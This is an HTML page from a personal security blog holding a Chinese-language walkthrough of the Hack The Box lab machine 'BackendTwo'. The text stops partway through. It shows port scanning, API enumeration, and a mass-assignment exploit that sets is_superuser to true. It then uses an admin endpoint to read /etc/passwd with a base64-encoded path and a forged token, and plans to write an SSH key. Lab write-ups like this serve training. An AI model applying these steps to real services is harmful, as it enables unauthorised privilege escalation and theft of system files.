@@ -1,0 +1,709 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="CrazyInSide">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Recon:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051Crazy:~&#x2F;HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.11.162[sudo] crazyins">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Walkthrough - BackendTwo">
+<meta property="og:url" content="https://crazyinside.github.io/post/HackTheBox-BackendTwo.html">
+<meta property="og:site_name" content="Network Security Notes">
+<meta property="og:description" content="Recon:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051Crazy:~&#x2F;HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.11.162[sudo] crazyins">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/BackendTwo.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828092318479.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828093139020.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828093233594.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828093347726.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828093815706.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828094018621.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828094628194.png">
+<meta property="article:published_time" content="2023-08-13T22:39:08.988Z">
+<meta property="article:modified_time" content="2023-08-11T16:43:26.890Z">
+<meta property="article:author" content="World&#39;sEnd">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/BackendTwo.png">
+  
+  
+  
+  <title>HTB Walkthrough - BackendTwo - Network Security Notes</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTB Walkthrough - BackendTwo"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-14 06:39" pubdate>
+          August 14, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          28k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          237 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HTB Walkthrough - BackendTwo</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/BackendTwo.png" srcset="/img/loading.gif" lazyload alt="BackendTwo"></p>
+<h6 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.11.162</span><br><span class="line">[sudo] crazyinside 的密码：</span><br><span class="line">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-28 00:52:55 GMT</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [131070 ports/host]</span><br><span class="line">Discovered open port 80/tcp on 10.10.11.162                                    </span><br><span class="line">Discovered open port 22/tcp on 10.10.11.162  </span><br><span class="line">Crazy:~/HackTheBox$ sudo nmap -sC -sV 10.10.11.162 -p80                              </span><br><span class="line">[sudo] crazyinside 的密码：</span><br><span class="line">Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-28 08:55 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.162</span><br><span class="line">Host is up (0.086s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    uvicorn</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (application/json).</span></span><br><span class="line"><span class="string">|_http-server-header: uvicorn</span></span><br><span class="line"><span class="string">| fingerprint-strings: </span></span><br><span class="line"><span class="string">|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 400 Bad Request</span></span><br><span class="line"><span class="string">|     content-type: text/plain; charset=utf-8</span></span><br><span class="line"><span class="string">|     Connection: close</span></span><br><span class="line"><span class="string">|     Invalid HTTP request received.</span></span><br><span class="line"><span class="string">|   FourOhFourRequest: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 404 Not Found</span></span><br><span class="line"><span class="string">|     date: Sun, 28 Aug 2022 00:55:40 GMT</span></span><br><span class="line"><span class="string">|     server: uvicorn</span></span><br><span class="line"><span class="string">|     content-length: 22</span></span><br><span class="line"><span class="string">|     content-type: application/json</span></span><br><span class="line"><span class="string">|     Connection: close</span></span><br><span class="line"><span class="string">|     &#123;&quot;detail&quot;:&quot;Not Found&quot;&#125;</span></span><br><span class="line"><span class="string">|   GetRequest: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 200 OK</span></span><br><span class="line"><span class="string">|     date: Sun, 28 Aug 2022 00:55:29 GMT</span></span><br><span class="line"><span class="string">|     server: uvicorn</span></span><br><span class="line"><span class="string">|     content-length: 22</span></span><br><span class="line"><span class="string">|     content-type: application/json</span></span><br><span class="line"><span class="string">|     Connection: close</span></span><br><span class="line"><span class="string">|     &#123;&quot;msg&quot;:&quot;UHC Api v2.0&quot;&#125;</span></span><br><span class="line"><span class="string">|   HTTPOptions: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 405 Method Not Allowed</span></span><br><span class="line"><span class="string">|     date: Sun, 28 Aug 2022 00:55:35 GMT</span></span><br><span class="line"><span class="string">|     server: uvicorn</span></span><br><span class="line"><span class="string">|     content-length: 31</span></span><br><span class="line"><span class="string">|     content-type: application/json</span></span><br><span class="line"><span class="string">|     Connection: close</span></span><br><span class="line"><span class="string">|_    &#123;&quot;detail&quot;:&quot;Method Not Allowed&quot;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 68.04 seconds</span></span><br><span class="line"><span class="string">zsh: segmentation fault  sudo nmap -sC -sV 10.10.11.162 -p80</span></span><br></pre></td></tr></table></figure>
+
+<p>一样的配方：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ feroxbuster -u http://10.10.11.162/                                        </span><br><span class="line"></span><br><span class="line"> ___  ___  __   __     __      __         __   ___</span><br><span class="line">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span><br><span class="line">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span><br><span class="line">by Ben <span class="string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.7.0</span><br><span class="line">───────────────────────────┬──────────────────────</span><br><span class="line"> 🎯  Target Url            │ http://10.10.11.162/</span><br><span class="line"> 🚀  Threads               │ 50</span><br><span class="line"> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt</span><br><span class="line"> 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]</span><br><span class="line"> 💥  Timeout (secs)        │ 7</span><br><span class="line"> 🦡  User-Agent            │ feroxbuster/2.7.0</span><br><span class="line"> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml</span><br><span class="line"> 🏁  HTTP methods          │ [GET]</span><br><span class="line"> 🔃  Recursion Depth       │ 4</span><br><span class="line"> 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest</span><br><span class="line">───────────────────────────┴──────────────────────</span><br><span class="line"> 🏁  Press [ENTER] to use the Scan Management Menu™</span><br><span class="line">──────────────────────────────────────────────────</span><br><span class="line">200      GET        1l        3w       22c http://10.10.11.162/</span><br><span class="line">401      GET        1l        2w       30c http://10.10.11.162/docs</span><br><span class="line">200      GET        1l        1w       19c http://10.10.11.162/api</span><br><span class="line">[<span class="comment">####################] - 2m     30000/30000   0s      found:3       errors:0      </span></span><br><span class="line">[<span class="comment">####################] - 2m     30000/30000   235/s   http://10.10.11.162/ </span></span><br><span class="line"></span><br><span class="line">Crazy:~/HackTheBox$ curl  http://10.10.11.162/docs</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;detail&quot;</span>:<span class="string">&quot;Not authenticated&quot;</span>&#125;                                                                                                                                                 </span><br><span class="line">Crazy:~/HackTheBox$ curl http://10.10.11.162/api  </span><br><span class="line">&#123;<span class="string">&quot;endpoints&quot;</span>:<span class="string">&quot;/v1&quot;</span>&#125;                                                                                                                                                 </span><br><span class="line">Crazy:~/HackTheBox$ curl http://10.10.11.162/api/v1</span><br><span class="line">&#123;<span class="string">&quot;endpoints&quot;</span>:[<span class="string">&quot;/user&quot;</span>,<span class="string">&quot;/admin&quot;</span>]&#125;                                                                                                                                                 </span><br><span class="line">Crazy:~/HackTheBox$ curl http://10.10.11.162/api/v1/admin</span><br><span class="line">                                                                                                                                                 </span><br><span class="line">Crazy:~/HackTheBox$ curl http://10.10.11.162/api/v1/admin/</span><br><span class="line">&#123;<span class="string">&quot;detail&quot;</span>:<span class="string">&quot;Not authenticated&quot;</span>&#125;                                                                                                                                                 </span><br><span class="line">Crazy:~/HackTheBox$ curl http://10.10.11.162/api/v1/user/ </span><br><span class="line">&#123;<span class="string">&quot;detail&quot;</span>:<span class="string">&quot;Not Found&quot;</span>&#125;                                                                                                                                                 </span><br><span class="line">Crazy:~/HackTheBox$ curl http://10.10.11.162/api/v1/user/1</span><br><span class="line">&#123;<span class="string">&quot;guid&quot;</span>:<span class="string">&quot;25d386cd-b808-4107-8d3a-4277a0443a6e&quot;</span>,<span class="string">&quot;email&quot;</span>:<span class="string">&quot;admin@backendtwo.htb&quot;</span>,<span class="string">&quot;profile&quot;</span>:<span class="string">&quot;UHC Admin&quot;</span>,<span class="string">&quot;last_update&quot;</span>:null,<span class="string">&quot;time_created&quot;</span>:1650987800991,<span class="string">&quot;is_superuser&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;id&quot;</span>:1&#125;                                                                                                                                                 </span><br><span class="line">razy:~/HackTheBox$ curl http://10.10.11.162/api/v1/user/signup  -d <span class="string">&#x27;&#123;&quot;id&quot;:&quot;crazyinside&quot;&#125;&#x27;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> | jq .</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100   189  100   169  100    20    648     76 --:--:-- --:--:-- --:--:--   724</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;detail&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;loc&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;body&quot;</span>,</span><br><span class="line">        <span class="string">&quot;email&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;field required&quot;</span>,</span><br><span class="line">      <span class="string">&quot;type&quot;</span>: <span class="string">&quot;value_error.missing&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;loc&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;body&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;field required&quot;</span>,</span><br><span class="line">      <span class="string">&quot;type&quot;</span>: <span class="string">&quot;value_error.missing&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line">                                                                                                                                                 </span><br><span class="line">Crazy:~/HackTheBox$ curl http://10.10.11.162/api/v1/user/signup  -d <span class="string">&#x27;&#123;&quot;email&quot;:&quot;crazy@inside.htb&quot;,&quot;password&quot;:&quot;Password1!&quot;&#125;&#x27;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span>|jq .  </span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100    54  100     2  100    52      2     70  0:00:01 --:--:--  0:00:01    73</span><br><span class="line">&#123;&#125;</span><br><span class="line">                                                                                                                                                 </span><br><span class="line">Crazy:~/HackTheBox$ curl http://10.10.11.162/api/v1/user/signup  -d <span class="string">&#x27;&#123;&quot;email&quot;:&quot;crazy@inside.htb&quot;,&quot;password&quot;:&quot;Password1!&quot;&#125;&#x27;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span>|jq .</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100   121  100    69  100    52    269    202 --:--:-- --:--:-- --:--:--   472</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;detail&quot;</span>: <span class="string">&quot;The user with this username already exists in the system&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">                                                                                                                                                 </span><br><span class="line">Crazy:~/HackTheBox$ curl -s -X POST http://10.10.11.162/api/v1/user/login -d <span class="string">&quot;username=crazy@inside.htb&amp;password=Password1\!&quot;</span> |jq .</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;access_token&quot;</span>: <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzQwMTI1LCJpYXQiOjE2NjE2NDg5MjUsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6ImE3ZDFjY2NiLTYxMzQtNGY5MS1hMTM1LTMzYjY2YTJkNjUzYiJ9.XS6iyI0_QBAmNK19K4VgY2X8DgwQmjqRPMLAcrzHl6Y&quot;</span>,</span><br><span class="line">  <span class="string">&quot;token_type&quot;</span>: <span class="string">&quot;bearer&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">                                                                                                                                                 </span><br><span class="line">Crazy:~/HackTheBox$ </span><br></pre></td></tr></table></figure>
+
+<p>这里的后端页面与backend是一样的，只是在功能API上更新了一些，不再可以随意更改管理员密码了，当查询其他用户信息时会鉴权，但是新出了一个编辑用户配置文件的API。<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828092318479.png" srcset="/img/loading.gif" lazyload alt="image-20220828092318479"></p>
+<p>有一个批量分配的漏洞。可以更改json格式存储用户信息的字段。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ curl http://10.10.11.162/api/v1/user/12</span><br><span class="line">&#123;<span class="string">&quot;guid&quot;</span>:<span class="string">&quot;a7d1cccb-6134-4f91-a135-33b66a2d653b&quot;</span>,<span class="string">&quot;email&quot;</span>:<span class="string">&quot;crazy@inside.htb&quot;</span>,<span class="string">&quot;profile&quot;</span>:null,<span class="string">&quot;last_update&quot;</span>:null,<span class="string">&quot;time_created&quot;</span>:1661648753362,<span class="string">&quot;is_superuser&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;id&quot;</span>:12&#125;  </span><br></pre></td></tr></table></figure>
+
+<p>鉴权的字段我猜测是is_superuser，它是false，我需要将他改为true</p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828093139020.png" srcset="/img/loading.gif" lazyload alt="image-20220828093139020"></p>
+<p>返回了两百，好像是对了？</p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828093233594.png" srcset="/img/loading.gif" lazyload alt="image-20220828093233594"></p>
+<p>通过查询可以看到确实如此。这次是没有命令执行功能的，但是可以写文件：</p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828093347726.png" srcset="/img/loading.gif" lazyload alt="image-20220828093347726"></p>
+<p>写文件最好的方式便是写ssh秘钥了。不过首先需要知道目标有哪些用户，读取文件API有提示说是base64_url编码文件名：</p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828093815706.png" srcset="/img/loading.gif" lazyload alt="image-20220828093815706"></p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828094018621.png" srcset="/img/loading.gif" lazyload alt="image-20220828094018621"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ curl -X <span class="string">&#x27;GET&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;http://10.10.11.162/api/v1/admin/file/L2V0Yy9wYXNzd2Q&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;accept: application/json&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzQxNTI5LCJpYXQiOjE2NjE2NTAzMjksInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiYTdkMWNjY2ItNjEzNC00ZjkxLWExMzUtMzNiNjZhMmQ2NTNiIn0.oMAp9euGXoknNfwl8YKkDa4jWOk8BbylF7V8X2WoWFY&#x27;</span> -s |jq .</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;file&quot;</span>: <span class="string">&quot;root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nsshd:x:112:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nhtb:x:1000:1000:htb:/home/htb:/bin/bash\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\n&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>能够被用来登录的普通用户应该是htb，而且没有现成的秘钥可读。但是当我尝试写文件，会像上次提示的一样，需要debug标志：</p>
